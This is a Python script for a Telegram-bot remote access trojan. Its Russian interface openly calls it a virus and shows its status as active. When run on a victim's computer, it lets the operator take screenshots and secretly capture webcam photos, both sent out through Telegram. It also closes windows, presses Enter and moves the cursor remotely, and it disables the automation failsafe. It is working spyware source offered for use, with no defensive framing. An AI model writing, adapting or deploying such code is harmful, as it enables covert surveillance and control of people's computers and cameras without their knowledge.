import telebot
from telebot import types
import time
import pyautogui
import cv2
import pyautogui as pg
import os

pyautogui.FAILSAFE= False 
t = time.strftime("%X")
beta = 2
bot = telebot.TeleBot("token")
@bot.message_handler(commands=['start'])
def send_welcome(message):
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("Проверить подключение")
    btn2 = types.KeyboardButton("Вебка")
    btn3 = types.KeyboardButton("Скрин")
    btn5 = types.KeyboardButton("Убить вирус")
    markup.add(btn1)
    markup.add(btn2, btn3)
    markup.add(btn5)
    bot.send_message(message.chat.id, f"Файл с вирусом: Активен \nСервер был подключён в: {t} \nВремя у сервера: " + time.strftime("%X"), reply_markup=markup)
    bot.send_message(message.chat.id, "Надеюсь вы прочитали руководство" , reply_markup=markup)

   
@bot.message_handler(func=lambda message: True)
def echo_all(message):
    global beta
   
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("Проверить подключение")
    btn2 = types.KeyboardButton("Вебка")
    btn3 = types.KeyboardButton("Скрин")
    btn5 = types.KeyboardButton("Далее")
    markup.add(btn1)
    markup.add(btn2, btn3)
    markup.add(btn5)

    markup2 = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn22 = types.KeyboardButton("Закрыть вкладку")
    btn33 = types.KeyboardButton("Enter")
    btn44 = types.KeyboardButton("Минус курсор")
    btn55 = types.KeyboardButton("Убить вирус")
    btn66 = types.KeyboardButton("Назад")
    markup2.add(btn22, btn33)
    markup2.add(btn44, btn55)
    markup2.add(btn66)


    soglas = types.ReplyKeyboardMarkup(resize_keyboard=True)
    sog1 = types.KeyboardButton("Да")
    sog2 = types.KeyboardButton("Нет")
    soglas.add(sog1,sog2)
 
    if message.text == "Проверить подключение":
        bot.send_message(message.chat.id, f"Файл с вирусом: Активен \nСервер был подключён в: {t} \nВремя у сервера: " + time.strftime("%X"), reply_markup=markup)
    if message.text == "Убить вирус": 
        bot.send_message(message.chat.id, "Вы точно хотите убить вирус ?", reply_markup=soglas)
        beta = 1
    if message.text == "Да" and beta == 1:
        bot.send_message(message.chat.id, "Вирус был выключен", reply_markup=markup)
        bot.stop_polling()
    if message.text == "Нет" and beta == 1:
        beta = 2 
        bot.send_message(message.chat.id, "Отлично!", reply_markup=markup2)
    if message.text == "Скрин":
        screen = pyautogui.screenshot()
        bot.send_photo(message.chat.id, screen)
    
     
    if message.text == "Вебка":
        bot.send_message(message.chat.id, "Подождите", reply_markup=markup)
        cap = cv2.VideoCapture(0)

        if not cap.isOpened():
            bot.send_message(message.chat.id, "Не удалось открыть камеру", reply_markup=markup)

        for i in range(30):
            cap.read()
            
        ret, frame = cap.read()
        
        cv2.imwrite('cam.png', frame)
        photo = open('cam.png', 'rb')
        bot.send_photo(message.chat.id, photo)
        photo.close()
        
        cap.release()
        os.remove("cam.png")
 

    if message.text == "Далее":
        bot.send_message(message.chat.id, "Вторая панель", reply_markup=markup2)
    if message.text == "Назад":
        bot.send_message(message.chat.id, "Первая панель", reply_markup=markup)
    if message.text == "Закрыть вкладку":
        bot.send_message(message.chat.id, "Вкладка успешно была закрыта", reply_markup=markup2)
        pg.hotkey("alt", "F4")
    if message.text == "Enter":
        bot.send_message(message.chat.id, "Вкладка успешно была закрыта", reply_markup=markup2)
        pg.press("Enter")
    if message.text == "Минус курсор":
        bot.send_message(message.chat.id, "Курсор сломан на 0.2сек", reply_markup=markup2)
        pyautogui.moveTo(0, 0)
    

        


bot.infinity_polling()  
